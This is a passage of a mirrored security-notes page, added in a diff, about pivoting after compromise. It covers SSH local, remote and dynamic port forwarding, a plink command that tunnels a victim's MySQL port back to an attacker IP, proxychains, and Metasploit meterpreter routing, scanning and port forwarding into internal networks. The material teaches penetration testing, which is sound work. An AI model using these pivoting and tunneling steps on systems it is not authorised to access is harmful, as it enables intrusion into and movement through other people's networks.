+<li>You want to bypass firewall rules.</li>
+</ul>
+<h3 id="local-port-forwarding">Local port forwarding</h3>
+<p>Now facebook will be available on address localhost:8080.</p>
+<pre><code>ssh -L 8080:www.facebook.com:80 localhost
+</code></pre><p>You can also forward ports like this:</p>
+<pre><code>ssh username@&lt;remote-machine&gt; -L localport:target-ip:target-port
+
+ssh username@192.168.1.111 -L 5000:192.168.1.222:5000
+</code></pre><p>Now this port will be available on your localhost.
+So you go to:</p>
+<pre><code>nc localhost:10000
+</code></pre><h3 id="remote-port-forwarding">Remote port forwarding</h3>
+<p>Remote port forwarding is crazy, yet very simple concept. So imagine that you have compromised a machine, and that machine has like MYSQL running but it is only accessible for localhost. And you can&apos;t access it because you have a really crappy shell. So what we can do is just forward that port to our attacking machine. The steps are as following:</p>
+<p>Here is how you create a remote port forwarding:</p>
+<pre><code>ssh &lt;gateway&gt; -R &lt;remote port to bind&gt;:&lt;local host&gt;:&lt;local port&gt;
+</code></pre><p>By the way, plink is a ssh-client for windows that can be run from the terminal. The ip of the attacking machine is <strong>111.111.111.111</strong>.</p>
+<p><strong>Step 1</strong>
+So on our compromised machine we do:</p>
+<pre><code>plink.exe -l root -pw mysecretpassword 111.111.111.111 -R 3307:127.0.0.1:3306
+</code></pre><p><strong>Step 2</strong>
+Now we can check netstat on our attacking machine, we should see something like this:</p>
+<pre><code>tcp        0      0 127.0.0.1:3307          0.0.0.0:*               LISTEN      19392/sshd: root@pt
+</code></pre><p>That means what we can connect to that port on the attacking machine from the attacking machine.</p>
+<p><strong>Step 3</strong>
+Connect using the following command:</p>
+<pre><code>mysql -u root -p -h 127.0.0.1 --port=3307
+</code></pre><h3 id="dynamic-port-forwarding">Dynamic port forwarding</h3>
+<p>This can be used to dynamically forward all traffic from a specific application. This is really cool. With remote and local port forwarding you are only forwarding a single port. But that can be a hassle if your target machine has 10 ports open that you want to connect to. So instad we can use a dynamic port forwarding technique. </p>
+<p>Dynamic port forwarding sounds really complicated, but it is incredibly easy to set up.
+Just set up the tunnel like this. After it is set up do not run any commands in that session.</p>
+<pre><code># We connect to the machine we want to pivot from
+ssh -D 9050 user@192.168.1.111
+</code></pre><p>Since proxychains uses 9050 by defualt (the default port for tor) we don&apos;t even need to configure proxychains. But if you want to change the port you can do that in <code>/etc/proxychains.conf</code>.</p>
+<pre><code>proxychains nc 192.168.2.222 21
+</code></pre><p>So supress all the logs from proxychains you can configure it in the config file.</p>
+<h4 id="tunnel-all-httphttps-traffic-through-ssh">Tunnel all http/https traffic through ssh</h4>
+<p>For this we need two machines.
+Machine1 - 111.111.1111.111 - The server that works as our proxy.
+Machine2 - The computer with the web browser.</p>
+<p>First we check out what out public IP adress is, so that we know the IP address before and after, so we can verify that it works.
+First you set ssh to:</p>
+<pre><code># On Machine2 we run
+ssh -D localhost:9999 root@111.111.111.111
+
+# Can also be run with the -N flag
+ssh -D localhost:9999 root@111.111.111.111 -N
+</code></pre><p>Now you go to Firefox/settings/advanced/network and <strong>SOCKS</strong> you add 
+<strong>127.0.0.1</strong> and port <strong>9999</strong></p>
+<p>Notice that this setup probably leaks DNS. So don&apos;t use it if you need opsec.</p>
+<p>To fix the DNS-leak you can go to <strong>about:config</strong> in firefox (in the addressbar) then look for <strong>network.proxy.socks_remote_dns</strong>, and switch it to <strong>TRUE</strong>. Now you can check: <a href="https://ipleak.net/" target="_blank">https://ipleak.net/</a></p>
+<p>But we are not done yet. It still says that we have <strong>WebRTC leaks</strong>. In order to solve this you can go to about:config again and set the following to <strong>FALSE</strong></p>
+<p><strong>media.peerconnection.enabled</strong></p>
+<h2 id="sshuttle">SShuttle</h2>
+<p>I haven&apos;t used this, but it might work.</p>
+<pre><code>sshuttle -r root@192.168.1.101 192.168.1.0/24
+</code></pre><h2 id="port-forward-with-metasploit">Port forward with metasploit</h2>
+<p>We can also forward ports using metasploit. Say that the compromised machine is running services that are only accessible from within the network, from within that machine. To access that port we can do this in meterpreter:</p>
+<pre><code>portfwd add -l &lt;attacker port&gt; -p &lt;victim port&gt; -r &lt;victim ip&gt;
+portfwd add -l 3306 -p 3306 -r 192.168.222
+</code></pre><p>Now we can access this port on our machine locally like this.</p>
+<pre><code>nc 127.0.0.1 3306
+</code></pre><h3 id="ping-sweep-the-network">Ping-sweep the network</h3>
+<p>First we want to scan the network to see what devices we can target. In this example we already have a meterpreter shell on a windows machine with SYSTEM-privileges.</p>
+<pre><code>meterpreter &gt; run arp_scanner -r 192.168.1.0/24
+</code></pre><p>This command will output all the devices on the netowork.</p>
+<h3 id="scan-each-host">Scan each host</h3>
+<p>Now that we have a list of all available machines. We want to portscan them.</p>
+<p>We will to that portscan through metasploit. Using this module:</p>
+<pre><code>use auxiliary/scanner/portscan/tcp
+</code></pre><p>If we run that module now it will only scan machines in the network we are already on. So first we need to connect us into the second network.</p>
+<p>On the already pwn machine we do</p>
+<pre><code>ipconfig
+</code></pre><p>Now we add the second network as a new route in metasploit. First we background our session, and then do this:</p>
+<pre><code># the ip addres and the subnet mask, and then the meterpreter session
+route add 192.168.1.101 255.255.255.0 1
+</code></pre><p>Now we can run our portscanning module:</p>
+<pre><code>use auxiliary/scanner/portscan/tcp
+</code></pre><h3 id="attack-a-specific-port">Attack a specific port</h3>
+<p>In order to attack a specific port we need to forwards it like this</p>
+<pre><code>portfwd add -l 3389 -p 3389 -r 192.168.1.222
+</code></pre><h2 id="references">References</h2>
+<p>This is a good video-explanation:</p>
+<p><a href="https://www.youtube.com/watch?v=c0XiaNAkjJA" target="_blank">https://www.youtube.com/watch?v=c0XiaNAkjJA</a></p>
+<p><a href="https://www.offensive-security.com/metasploit-unleashed/pivoting/" target="_blank">https://www.offensive-security.com/metasploit-unleashed/pivoting/</a></p>
+<p><a href="http://ways2hack.com/how-to-do-pivoting-attack/" target="_blank">http://ways2hack.com/how-to-do-pivoting-attack/</a></p>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="pass_the_hash_-_reusing_hashes.html" class="navigation navigation-prev " aria-label="Previous page: Pass the Hash - Reusing Hashes">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="network_traffic.html" class="navigation navigation-next " aria-label="Next page: Network traffic analysis">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"Pivoting - Port forwarding - Tunneling","level":"1.8","depth":1,"next":{"title":"Network traffic analysis","level":"1.9","depth":1,"path":"network_traffic.md","ref":"network_traffic.md","articles":[{"title":"Arp-spoofing","level":"1.9.1","depth":2,"path":"arp-spoofing.md","ref":"arp-spoofing.md","articles":[{"title":"SSL-strip","level":"1.9.1.1","depth":3,"path":"ssl-strip.md","ref":"ssl-strip.md","articles":[]}]},{"title":"DNS-spoofing","level":"1.9.2","depth":2,"path":"dns-spoofing.md","ref":"dns-spoofing.md","articles":[]},{"title":"Wireshark","level":"1.9.3","depth":2,"path":"wireshark.md","ref":"wireshark.md","articles":[]}]},"previous":{"title":"Pass the Hash - Reusing Hashes","level":"1.7.4","depth":2,"path":"pass_the_hash_-_reusing_hashes.md","ref":"pass_the_hash_-_reusing_hashes.md","articles":[]},"dir":"ltr"},"config":{"plugins":["comment"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"comment":{"highlightCommented":true},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"github":"xapax/security","theme":"default","author":"Philip Linghammar","pdf":{"pageNumbers":true,"fontSize":16,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Security - My notepad","language":"en","links":{"sidebar":{"Security - My notepad":"https://legacy.gitbook.com/book/xapax/security"},"gitbook":true},"gitbook":"*","description":"Stuff"},"file":{"path":"port_forwarding_and_tunneling.md","mtime":"2018-05-19T06:44:47.000Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2018-05-19T06:38:06.164Z"},"basePath":".","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="gitbook/gitbook.js"></script>
+    <script src="gitbook/theme.js"></script>
+    
+        
+        <script src="gitbook/gitbook-plugin-comment/plugin.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    
+<div><script style="display: none;" type="application/javascript">
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-57505611-7', 'auto', {name: 'microcdn'});
+  ga('microcdn.send', 'pageview');
+
+  var _cdn_prev_loc = window.location.pathname;
+  window.setInterval(function () {
+    if (window.location.pathname !== _cdn_prev_loc) {
+      _cdn_prev_loc = window.location.pathname;
+      ga('microcdn.send', 'pageview');
+    }
+  }, 100);
+
+</script></div>
+</body>
+
+<!-- Mirrored from xapax.gitbooks.io/security/content/port_forwarding_and_tunneling.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 26 Sep 2018 18:14:05 GMT -->
+</html>
+
